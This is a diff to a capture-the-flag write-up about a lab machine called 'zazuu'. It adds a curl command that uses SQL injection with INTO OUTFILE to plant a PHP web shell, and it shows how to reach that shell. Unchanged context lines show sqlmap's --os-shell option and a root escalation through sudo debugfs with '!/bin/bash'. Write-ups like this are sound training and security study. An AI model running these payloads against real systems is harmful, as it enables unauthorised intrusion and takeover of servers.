@@ -38,8 +38,22 @@ I went ahead to trigger a shell by using the `--os-shell` flag.
 ```bash
 sqlmap -r <request_file> --os-shell
 ```
-when asked for the path, I provided `/var/www/html/media`. */var/www/html* because that's mostly the default web root directory for web applications, and */media* because that's where files are stored in the web root. This was successful.
+when asked for the path, I provided `/var/www/html/media`. */var/www/html* because that's mostly the default web root directory for web applications, and */media* because that's where media files are stored and there's a probability that I have write privileges there. This was successful.
 ![](/assets/zazuu%20echoctf/6.png)
+
+*ALTERNATIVE*
+
+This can be also be achieved using curl with the command:
+```bash
+curl -X POST http://<target_ip>/ -s \
+  -d "mail-list=a@a.com' UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system(\$_GET[\"cmd\"]); ?>','' INTO OUTFILE '/var/www/html/media/shell.php'#" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+```
+and accessed on the webpage at:
+
+```bash
+http://<target_ip>/media/shell.php?cmd=<command>
+```
 
 For confirmation, I first executed the command `id` and it was successful so I sent a reverse shell connection.
 
@@ -66,7 +80,7 @@ export TERM=xterm
 After initial foothold, the next thing is to escalate privileges to root.
 I checked my sudo permissions and found `/sbin/debugfs`.
 
-I ran `sudo /sbin/debugfs` (*i always do this to observe script behavior*) and got provided with a field that requires my input. I typed `!/bin/bash` (*which is normally used shell escape*). This spawned me directly into root shell.
+I ran `sudo /sbin/debugfs` (*i always do this to observe script behavior*) and got provided with a field that requires my input. I typed `!/bin/bash` (*which is normally used for shell escape*). This spawned me directly into root shell.
 
 ![](/assets/zazuu%20echoctf/10.png)
 
